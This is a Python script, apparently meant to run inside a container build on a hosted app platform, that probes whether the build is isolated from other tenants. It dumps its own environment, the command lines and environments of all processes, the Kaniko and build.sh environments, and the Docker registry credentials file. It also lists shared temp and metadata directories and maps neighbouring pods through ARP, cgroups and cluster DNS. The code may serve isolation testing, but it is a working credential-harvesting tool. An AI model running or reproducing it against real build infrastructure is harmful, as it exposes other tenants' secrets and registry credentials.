import json, os, socket, subprocess, struct, time, glob

r = {}

# 1. Check our own build args / env - do we see the SECRET?
r['env'] = dict(os.environ)

# 2. Read ALL process cmdlines - look for --build-arg with secrets from other builds
procs = {}
try:
    for pid_dir in sorted(glob.glob('/proc/[0-9]*'), key=lambda x: int(x.split('/')[-1])):
        pid = pid_dir.split('/')[-1]
        try:
            cmdline = open(f'/proc/{pid}/cmdline').read().replace('\x00', ' ').strip()
            procs[pid] = {'cmdline': cmdline[:500]}
        except:
            pass
        try:
            environ = open(f'/proc/{pid}/environ').read().replace('\x00', '\n').strip()
            procs[pid]['environ'] = environ[:2000]
        except Exception as e:
            procs[pid]['environ_err'] = str(e)[:100]
        try:
            procs[pid]['comm'] = open(f'/proc/{pid}/comm').read().strip()
        except:
            pass
        try:
            procs[pid]['status'] = open(f'/proc/{pid}/status').read()[:500]
        except:
            pass
r['processes'] = procs

# 3. Check if we can see other build pods' processes via /proc
r['pid_max'] = 0
try:
    pids = [int(p) for p in os.listdir('/proc') if p.isdigit()]
    r['pid_count'] = len(pids)
    r['pid_max'] = max(pids) if pids else 0
    r['pid_list'] = sorted(pids)
except:
    pass

# 4. Check shared filesystems that might have other builds' data
shared_fs = {}
# Check if /kaniko is shared
try:
    shared_fs['kaniko_contents'] = []
    for root, dirs, files in os.walk('/kaniko'):
        for f in files:
            fp = os.path.join(root, f)
            try:
                st = os.stat(fp)
                shared_fs['kaniko_contents'].append(f'{fp} size={st.st_size} mode={oct(st.st_mode)}')
            except:
                pass
except:
    pass

# Check /tmp for shared data
try:
    shared_fs['tmp'] = os.listdir('/tmp')
except:
    pass

# Check /.app_platform/.tmp
try:
    shared_fs['app_tmp'] = os.listdir('/.app_platform/.tmp')
    for item in os.listdir('/.app_platform/.tmp'):
        fp = os.path.join('/.app_platform/.tmp', item)
        if os.path.isdir(fp):
            shared_fs[f'app_tmp_{item}'] = os.listdir(fp)
        else:
            try:
                shared_fs[f'app_tmp_{item}'] = open(fp).read()[:200]
            except:
                pass
except:
    pass

# Check build workspace
try:
    shared_fs['workspace'] = os.listdir('/.app_platform_workspace')
except:
    pass

r['shared_fs'] = shared_fs

# 5. Check the Kaniko executor cmdline specifically for --build-arg
try:
    for pid_dir in glob.glob('/proc/[0-9]*'):
        pid = pid_dir.split('/')[-1]
        try:
            cmdline = open(f'/proc/{pid}/cmdline').read()
            if 'executor' in cmdline or 'kaniko' in cmdline:
                # This is the Kaniko process - dump its full cmdline
                r['kaniko_cmdline'] = cmdline.replace('\x00', ' ')[:2000]
                # Also try to read its environ
                try:
                    r['kaniko_environ'] = open(f'/proc/{pid}/environ').read().replace('\x00', '\n')[:3000]
                except Exception as e:
                    r['kaniko_environ_err'] = str(e)[:100]
        except:
            pass
except:
    pass

# 6. Check the build.sh process for secrets in its environment
try:
    for pid_dir in glob.glob('/proc/[0-9]*'):
        pid = pid_dir.split('/')[-1]
        try:
            cmdline = open(f'/proc/{pid}/cmdline').read()
            if 'build.sh' in cmdline and pid != str(os.getpid()):
                r['buildsh_environ'] = open(f'/proc/{pid}/environ').read().replace('\x00', '\n')[:5000]
                break
        except:
            pass
except:
    pass

# 7. Check if the DOCR config has been updated with our secret
try:
    cfg = open('/kaniko/.docker/config.json').read()
    import base64
    r['docker_config_b64'] = base64.b64encode(cfg.encode()).decode()
except Exception as e:
    r['docker_config'] = str(e)[:100]

# 8. Check build metadata for cross-build info
try:
    meta_dir = '/.app_platform/.build_metadata'
    for root, dirs, files in os.walk(meta_dir):
        for f in files:
            fp = os.path.join(root, f)
            try:
                r[f'meta_{fp}'] = open(fp).read()[:300]
            except:
                pass
except:
    pass

# 9. Try to find other pods on the network (same build node)
# Check ARP table for neighbors
try:
    r['arp'] = open('/proc/net/arp').read()[:500]
except:
    pass

# 10. Check /sys/fs/cgroup for evidence of other containers on same host
try:
    # In cgroup v1, kubepods dir might show other containers
    cgroup_base = '/sys/fs/cgroup/cpu/kubepods'
    if os.path.exists(cgroup_base):
        r['cgroup_pods'] = []
        for item in os.listdir(os.path.join(cgroup_base, 'burstable')):
            if item.startswith('pod'):
                r['cgroup_pods'].append(item)
                # Try to list containers in each pod
                pod_dir = os.path.join(cgroup_base, 'burstable', item)
                try:
                    containers = [c for c in os.listdir(pod_dir) if len(c) > 20]
                    r[f'cgroup_{item}_containers'] = containers
                except:
                    pass
except Exception as e:
    r['cgroup_err'] = str(e)[:200]

# 11. Try /sys/fs/cgroup without cpu subdir
try:
    for cg_type in ['cpu', 'memory', 'blkio', 'pids']:
        base = f'/sys/fs/cgroup/{cg_type}/kubepods'
        if os.path.exists(base):
            r[f'cgroup_{cg_type}_exists'] = True
            try:
                burstable = os.path.join(base, 'burstable')
                if os.path.exists(burstable):
                    pods = os.listdir(burstable)
                    r[f'cgroup_{cg_type}_pods'] = pods[:20]
            except Exception as e:
                r[f'cgroup_{cg_type}_err'] = str(e)[:100]
except:
    pass

# 12. Check for cross-namespace DNS
dns_tests = {}
try:
    # Try to find other build namespaces
    import socket as s
    for ns in ['build-', 'app-', 'default', 'kube-system']:
        try:
            result = s.getaddrinfo(f'kubernetes.{ns}.svc.cluster.local', None)
            dns_tests[f'k8s_{ns}'] = str(result[0][4][0])
        except Exception as e:
            dns_tests[f'k8s_{ns}'] = str(e)[:60]
except:
    pass
r['dns'] = dns_tests

print(json.dumps(r, indent=2, default=str))
